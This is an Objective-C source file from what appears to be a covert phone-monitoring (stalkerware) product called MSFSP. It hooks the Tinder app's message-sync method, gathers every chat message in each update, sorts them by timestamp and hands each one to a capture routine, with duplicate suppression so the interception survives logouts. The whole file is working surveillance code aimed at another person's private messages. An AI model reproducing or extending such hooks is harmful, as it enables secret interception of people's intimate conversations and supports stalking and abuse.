//
//  Tinder.h
//  MSFSP
//
//  Created by Khaneid Hantanasiriskul on 7/21/2559 BE.
//
//

#import <Foundation/Foundation.h>

//Utils
#import "TinderUtils.h"
//Tinder Header File
#import "TNDRDataManager.h"
#import "TNDRDataInspector.h"

//Debug from view controller

//For outgoing Post share
HOOK(TNDRDataManager, mergeMatchUpdates$inContext$, BOOL, id arg1, id arg2) {
    BOOL result = CALL_ORIG(TNDRDataManager, mergeMatchUpdates$inContext$, arg1, arg2);
    
    @try {
        NSArray *updatesArray = arg1;
        
        if (updatesArray.count > 0) {
            DLog(@"New Update %@", updatesArray);
            
            NSMutableArray *capturingMessageArray = [NSMutableArray array];
            
            [updatesArray enumerateObjectsUsingBlock:^(NSDictionary *updatesDic, NSUInteger idx, BOOL * _Nonnull stop) {
                NSArray *messagesArray = updatesDic[@"messages"];
                if (messagesArray.count > 0) {
                    [messagesArray enumerateObjectsUsingBlock:^(NSDictionary *messageDic, NSUInteger idx, BOOL * _Nonnull stop) {
                        [capturingMessageArray addObject:messageDic];
                    }];
                }
            }];
            
            [capturingMessageArray sortUsingComparator:^NSComparisonResult(NSDictionary *messageDic1, NSDictionary *messageDic2) {
                long timeStamp1 = [messageDic1[@"timestamp"] longValue];
                long timeStamp2 = [messageDic2[@"timestamp"] longValue];
                
                if (timeStamp1 < timeStamp2) {
                    return NSOrderedAscending;
                }
                else if (timeStamp1 == timeStamp2) {
                    return NSOrderedSame;
                }
                
                return NSOrderedDescending;
            }];
            
            DLog(@"capturingMessageArray %@", capturingMessageArray);
            
            if (capturingMessageArray.count > 0) {
                [capturingMessageArray enumerateObjectsUsingBlock:^(NSDictionary *messageDic, NSUInteger idx, BOOL * _Nonnull stop) {
                    @try {
                        NSString *messageId = messageDic[@"_id"];
                        if ([[TinderUtils sharedTinderUtils] canCaptureMessageWithUniqueId:messageId]) {
                            [[TinderUtils sharedTinderUtils] storeCapturedMessageUniqueId:messageId];
                            [[TinderUtils sharedTinderUtils] captureTinderMessageFromMessageDict:messageDic inContext:arg2];
                        }
                        else {
                                //To prevent duplicate issue in case of user log out and log in again
                            DLog(@"Already Capture message with id %@", messageId);
                        }
                    } @catch (NSException *exception) {
                         DLog(@"Found exception %@", exception);
                    } @finally {
                        //Done
                    }

                }];
            }
        }
    } @catch (NSException *exception) {
        DLog(@"Found exception %@", exception);
    } @finally {
        //Done
    }

    
    return result;
}
